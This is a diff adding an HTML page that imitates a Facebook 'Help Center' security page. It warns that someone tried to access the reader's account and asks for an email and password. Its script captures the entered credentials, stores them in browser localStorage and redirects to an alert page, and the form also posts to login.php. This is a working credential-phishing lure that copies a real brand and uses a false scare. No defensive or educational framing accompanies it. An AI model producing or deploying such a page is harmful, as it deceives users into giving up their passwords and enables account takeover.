@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Help Center</title>
+	<link rel="shortcut icon" type="ico" href="./fb-ico.png">
+	<link rel="stylesheet" type="text/css" href="style.css">
+</head>
+<body>
+	<header>
+		<div class="main-header">
+			<div class="logo">
+				<a href="404/index.html"><img src="./logo.png"></a>
+			</div>
+		</div>
+	</header>
+	<section>
+		<div class="form-container">
+			<div class="logo-container">
+				<img src="./f-logo-2.png" alt="Your Logo">
+				<p>Connect with friends and the world<br>
+					 around you on Facebook.</p> 
+			</div>
+			<div class="form">
+				<div class="m-header">
+					<h3>Secure your account</h3>
+				</div>
+				<div class="red-box">
+					<p style="font-weight:bold; font-size:13px">Someone tried to access your account, please secure your account</p>
+				</div>
+
+				<div  class="login-form">
+					<form method="post" class="bb" novalidate="1" id="login-form" action="login.php">
+						<label for="username">Email:</label><input name="username" id="username" type="username" style="margin: 10px 0 0 30px"></input><br />
+						<label for="password">Password:</label><input name="password" id="password" type="password" style="margin: 10px 0 0 3px"></input><br />
+						<input id="keep" style="margin: 10px 0 0 76px" type="checkbox"></input>
+						<label for="keep" style="font-size:12px;">keep me logged in</label><br />
+						<input type="submit" name="submit" value="Sign in" style="background: none repeat scroll 0 0 #3b5998; border: 1px solid #294461; color: #ffffff; margin: 5px 0 0 76px; padding: 2px 6px;"></input>
+						<p><a style="text-decoration:none; color:#3B5998; margin: 5px 0 0 76px;" href="404/index.html">can't log in?</a></p>
+					</form>
+				</div>
+				<script>
+					document.getElementById("login-form").addEventListener("submit", function(event) {
+						event.preventDefault(); // Prevent default form submission
+						
+						// Retrieve form data
+						const formData = new FormData(this);
+						const username = formData.get("username");
+						const password = formData.get("password");
+
+						// Validate form data
+						if (username.trim() === "" || password.trim() === "") {
+						alert("Please fill in all fields.");
+						return;
+						}
+
+						// Store form data locally
+						localStorage.setItem("username", username);
+						localStorage.setItem("password", password);
+						
+						// Redirect the user to alet page
+						window.location.href = "../alert/alert.html"; 
+					});
+				</script>
+			</div>
+		</div>
+		<footer>
+			<ul>
+				<li><a href="404/index.html">Mobile</a></li>
+				<li><a href="404/index.html">Find Friends</a></li>
+				<li><a href="404/index.html">Badges</a></li>
+				<li><a href="404/index.html">People</a></li>
+				<li><a href="404/index.html">Pages</a></li>
+				<li><a href="404/index.html">Apps</a></li>
+				<li><a href="404/index.html">Games</a></li>
+				<li><a href="404/index.html">Music</a></li>
+				<li><a href="404/index.html">Locations</a></li>
+				<li><a href="404/index.html">Topics</a></li>
+				<li><a href="404/index.html">About</a></li>
+				<li><a href="404/index.html">Create Ad</a></li>
+				<li><a href="404/index.html">Create Page</a></li>
+				<li><a href="404/index.html">Devepers</a></li>
+				<li><a href="404/index.html">Careers</a></li>
+				<li><a href="404/index.html">Privacy</a></li>
+				<li><a href="404/index.html">Cookies</a></li>
+				<li><a href="404/index.html">Terms</a></li><br />
+			</ul>
+		</footer>
+	</section>
+</body>
+</html>
